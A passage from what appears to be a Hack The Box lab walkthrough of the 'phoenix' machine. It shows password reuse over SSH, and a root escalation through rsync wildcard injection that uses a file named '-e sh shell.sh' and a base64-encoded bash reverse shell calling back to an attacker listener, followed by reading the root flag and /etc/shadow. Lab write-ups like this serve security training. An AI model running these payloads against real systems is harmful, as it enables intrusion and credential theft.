<li><span class="exturl" data-url="aHR0cHM6Ly9tYW5wYWdlcy51YnVudHUuY29tL21hbnBhZ2VzL2Jpb25pYy9tYW44L3BhbV9nb29nbGVfYXV0aGVudGljYXRvci44Lmh0bWw=">pam_google_authenticator<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">auth [success=1 default=ignore] pam_access.so accessfile=/etc/security/access-local.conf</span><br><span class="line"></span><br><span class="line">wp_user@phoenix:~/wordpress$ <span class="built_in">cat</span> /etc/security/access-local.conf</span><br><span class="line">+ : ALL : 10.11.12.13/24</span><br><span class="line">- : ALL : ALL</span><br></pre></td></tr></table></figure>

<p>We need to connect from an IP on the 10.11.2.13&#x2F;24 subnet, which we can’t do from our machine or locally from the other machine. so we use ssh command in the wp_user shell:</p>
<p>We finally SSH over to the box, reusing editor‘s password:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">wp_user@phoenix:~/wordpress$ ssh editor@10.11.12.13</span><br><span class="line">$$$$$$$\  $$\                                     $$\           </span><br><span class="line">$$  __$$\ $$ |                                    \__|          </span><br><span class="line">$$ |  $$ |$$$$$$$\   $$$$$$\   $$$$$$\  $$$$$$$\  $$\ $$\   $$\ </span><br><span class="line">$$$$$$$  |$$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$ |\$$\ $$  |</span><br><span class="line">$$  ____/ $$ |  $$ |$$ /  $$ |$$$$$$$$ |$$ |  $$ |$$ | \$$$$  / </span><br><span class="line">$$ |      $$ |  $$ |$$ |  $$ |$$   ____|$$ |  $$ |$$ | $$  $$&lt;  </span><br><span class="line">$$ |      $$ |  $$ |\$$$$$$  |\$$$$$$$\ $$ |  $$ |$$ |$$  /\$$\ </span><br><span class="line">\__|      \__|  \__| \______/  \_______|\__|  \__|\__|\__/  \__|</span><br><span class="line">Password: superphoenix</span><br><span class="line">Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-96-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Thu 24 Mar 2022 07:03:51 AM UTC</span><br><span class="line"></span><br><span class="line">  System load:             0.0</span><br><span class="line">  Usage of /:              70.3% of 4.36GB</span><br><span class="line">  Memory usage:            26%</span><br><span class="line">  Swap usage:              0%</span><br><span class="line">  Processes:               244</span><br><span class="line">  Users logged <span class="keyword">in</span>:         0</span><br><span class="line">  IPv4 address <span class="keyword">for</span> ens160: 10.10.11.149</span><br><span class="line">  IPv6 address <span class="keyword">for</span> ens160: dead:beef::250:56ff:feb9:ce55</span><br><span class="line">  IPv4 address <span class="keyword">for</span> eth0:   10.11.12.13</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">8 updates can be applied immediately.</span><br><span class="line">8 of these updates are standard security updates.</span><br><span class="line">To see these additional updates run: apt list --upgradable</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The list of available updates is more than a week old.</span><br><span class="line">To check <span class="keyword">for</span> new updates run: sudo apt update</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Wed Mar 23 18:41:06 2022 from 10.11.12.13</span><br><span class="line">editor@phoenix:~$ <span class="built_in">id</span></span><br><span class="line">uid=1002(editor) gid=1002(editor) <span class="built_in">groups</span>=1002(editor)</span><br><span class="line">editor@phoenix:~$ <span class="built_in">whoami</span></span><br><span class="line">editor</span><br><span class="line">editor@phoenix:~$ <span class="built_in">cat</span> user.txt </span><br><span class="line">8c36b4a1e1ba0a43169f10a1d0975fee</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2191.jpg"></li>
</ul>
<h1 id="Root-own"><a href="#Root-own" class="headerlink" title="Root own"></a>Root own</h1><p>we found a cron job file in </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">editor@phoenix:/dev/shm$ find /usr/local/bin/ -perm -o=x -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/usr/local/bin/cron.sh.x</span><br></pre></td></tr></table></figure>

<p>We can run pspy however we can’t see processes from other users. Enumerating the box more, we find cron.sh.x, if we run this manually and see what it’s doing:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">2022/03/23 19:15:04 CMD: UID=1002 PID=50487  | /usr/local/bin/cron.sh.x -c <span class="built_in">exec</span> <span class="string">&#x27;/usr/local/bin/cron.sh.x&#x27;</span> <span class="string">&quot;<span class="variable">$@</span>&quot;</span> /usr/local/bin/cron.sh.x</span><br><span class="line">2022/03/23 19:15:04 CMD: UID=1002 PID=50489  | mysqldump -u root wordpress </span><br><span class="line">2022/03/23 19:15:04 CMD: UID=1002 PID=50490  | tar -cf phoenix.htb.2022-03-23-19-15.tar dbbackup.sql </span><br><span class="line">2022/03/23 19:15:04 CMD: UID=1002 PID=50491  | <span class="built_in">rm</span> dbbackup.sql </span><br><span class="line">2022/03/23 19:15:04 CMD: UID=1002 PID=50492  | gzip -9 phoenix.htb.2022-03-23-19-15.tar </span><br><span class="line">2022/03/23 19:15:20 CMD: UID=1002 PID=50493  | find . -<span class="built_in">type</span> f -mmin +30 -delete </span><br><span class="line">2022/03/23 19:15:20 CMD: UID=1002 PID=50494  | rsync --ignore-existing -t phoenix.htb.2022-03-23-18-48.tar.gz phoenix.htb.2022-03-23-18-51.tar.gz phoenix.htb.2022-03-23-18-54.tar.gz phoenix.htb.2022-03-23-18-57.tar.gz phoenix.htb.2022-03-23-19-00.tar.gz phoenix.htb.2022-03-23-19-03.tar.gz phoenix.htb.2022-03-23-19-05.tar.gz phoenix.htb.2022-03-23-19-06.tar.gz phoenix.htb.2022-03-23-19-09.tar.gz phoenix.htb.2022-03-23-19-12.tar.gz phoenix.htb.2022-03-23-19-15.tar.gz jit@10.11.12.14:/backups/</span><br><span class="line">2022/03/23 19:15:20 CMD: UID=1002 PID=50495  | ssh -l jit 10.11.12.14 rsync --server -te.LsfxC --ignore-existing . /backups/</span><br></pre></td></tr></table></figure>

<p>It seems to use a few wild cards. We can try exploit this line:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync --ignore-existing -t *.* jit@10.11.12.14:/backups/</span><br></pre></td></tr></table></figure>

<p>We can see some article here:</p>
<ul>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvcnN5bmMv">gtfobins-rsync<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9ib29rLmhhY2t0cmlja3MueHl6L2xpbnV4LXVuaXgvcHJpdmlsZWdlLWVzY2FsYXRpb24vd2lsZGNhcmRzLXNwYXJlLXRyaWNrcw==">Wildcards Spare tricks<i class="fa fa-external-link-alt"></i></span></p>
</li>
</ul>
<p>We can create 2 files in &#x2F;backups to exploit this:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjEwLzEyMzQgMD4mMQ==|base64 -d|bash&quot;</span> &gt; shell.sh</span><br><span class="line"></span><br><span class="line"><span class="built_in">touch</span> -- <span class="string">&quot;-e sh shell.sh&quot;</span></span><br><span class="line"></span><br><span class="line">editor@phoenix:/backups$ <span class="built_in">chmod</span> +x shell.sh</span><br><span class="line">editor@phoenix:/backups$ <span class="built_in">chmod</span> +x -- <span class="string">&#x27;-e sh shell.sh&#x27;</span></span><br><span class="line">editor@phoenix:/backups$ <span class="built_in">ls</span> -la</span><br><span class="line">total 5300</span><br><span class="line">drwxr-x---  2 editor editor   4096 Mar 23 19:39  .</span><br><span class="line">drwxr-xr-x 20 root   root     4096 Feb 25 19:40  ..</span><br><span class="line">-rwxrwxr-x  1 editor editor      0 Mar 23 19:38 <span class="string">&#x27;-e sh shell.sh&#x27;</span></span><br><span class="line">-rw-r--r--  1 root   root   675305 Mar 23 19:12  phoenix.htb.2022-03-23-19-12.tar.gz</span><br><span class="line">-rw-rw-r--  1 editor editor    151 Mar 23 19:15  phoenix.htb.2022-03-23-19-15.tar.gz</span><br><span class="line">-rw-r--r--  1 root   root   675308 Mar 23 19:18  phoenix.htb.2022-03-23-19-18.tar.gz</span><br><span class="line">-rw-r--r--  1 root   root   675308 Mar 23 19:21  phoenix.htb.2022-03-23-19-21.tar.gz</span><br><span class="line">-rw-r--r--  1 root   root   675303 Mar 23 19:24  phoenix.htb.2022-03-23-19-24.tar.gz</span><br><span class="line">-rw-rw-r--  1 editor editor    152 Mar 23 19:27  phoenix.htb.2022-03-23-19-27.tar.gz</span><br><span class="line">-rw-r--r--  1 root   root   675307 Mar 23 19:30  phoenix.htb.2022-03-23-19-30.tar.gz</span><br><span class="line">-rw-r--r--  1 root   root   675307 Mar 23 19:33  phoenix.htb.2022-03-23-19-33.tar.gz</span><br><span class="line">-rw-r--r--  1 root   root   675308 Mar 23 19:36  phoenix.htb.2022-03-23-19-36.tar.gz</span><br><span class="line">-rw-r--r--  1 root   root   675308 Mar 23 19:39  phoenix.htb.2022-03-23-19-39.tar.gz</span><br><span class="line">-rwxrwxr-x  1 editor editor     85 Mar 23 19:39  shell.sh</span><br></pre></td></tr></table></figure>

<p>after 3 minutes, we got a root shell:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/phoenix]</span><br><span class="line">└─<span class="comment"># nc -lvp 1234</span></span><br><span class="line">Ncat: Version 7.92 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::1234</span><br><span class="line">Ncat: Listening on 0.0.0.0:1234</span><br><span class="line">Ncat: Connection from 10.10.11.149.</span><br><span class="line">Ncat: Connection from 10.10.11.149:34274.</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (50726): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">root@phoenix:/backups<span class="comment"># cat /root/root.txt</span></span><br><span class="line"><span class="built_in">cat</span> /root/root.txt</span><br><span class="line">258b721224d4a73b09b555077a962004</span><br><span class="line">root@phoenix:/backups<span class="comment"># cat /etc/shadow | grep root</span></span><br><span class="line"><span class="built_in">cat</span> /etc/shadow | grep root</span><br><span class="line">root:$6$U6DRf4846rMqwA5E<span class="variable">$Bwo3RxRA1t15bx6xvX8fVZ1cNfMoFVkpwyoWcK2gz3HRX16</span>/d.zqHlQI68v8drjuFWucpXhRYpIbnhg35.Vjc0:18944:0:99999:7:::</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2192.jpg"></li>
</ul>
<h1 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h1><ul>
<li>wordpress enumeration</li>
<li>Asgaros Forum &lt; 2.0.0 plugin - Subscriber+ Blind SQL Injection</li>
<li>john crack wordpress hash</li>
<li>Exploit Title: Wordpress Plugin Download From Files 1.48 - Arbitrary File Upload to get shell</li>
<li>OPT KEY decrypt</li>
<li>bypass linux 2FA</li>
<li>use cron job file rsync process to privesc</li>
</ul>
<h1 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h1><ul>
<li>QQ: 1185151867</li>
<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button>
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechatpay.png" alt="fdvoid0 WeChat Pay">
        <span>WeChat Pay</span>
      </div>
      <div>
        <img src="/images/alipay.png" alt="fdvoid0 Alipay">
        <span>Alipay</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>fdvoid0
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://fdlucifer.github.io/2022/03/24/phoenix/" title="Hack-The-Box-walkthrough[phoenix]">https://fdlucifer.github.io/2022/03/24/phoenix/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

          <div class="followme">
  <span>Welcome to my other publishing channels</span>

  <div class="social-list">

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
            <span class="icon">
              <i class="fab fa-twitter"></i>
            </span>

            <span class="label">Twitter</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
            <span class="icon">
              <i class="fab fa-telegram"></i>
            </span>

            <span class="label">Telegram</span>
          </a>
      </div>

      <div class="social-item">
          <span class="social-link">
            <span class="icon">
              <i class="fab fa-weixin"></i>
            </span>

            <span class="label">WeChat</span>
          </span>

          <img class="social-item-img" src="/images/wechat_channel.jpg">
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
            <span class="icon">
              <i class="fa fa-stack-exchange"></i>
            </span>

            <span class="label">infosec.exchange</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="/atom.xml">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>

            <span class="label">RSS</span>
          </a>
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2022/03/23/catch/" rel="prev" title="Hack-The-Box-walkthrough[catch]">
                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[catch]
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2022/03/27/timelapse/" rel="next" title="Hack-The-Box-walkthrough[timelapse]">
                  Hack-The-Box-walkthrough[timelapse] <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2017 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">fdvoid0</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>Word count total: </span>
    <span title="Word count total">644k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>Reading time total &asymp;</span>
    <span title="Reading time total">39:02</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.8/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/pace.js"></script>

  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
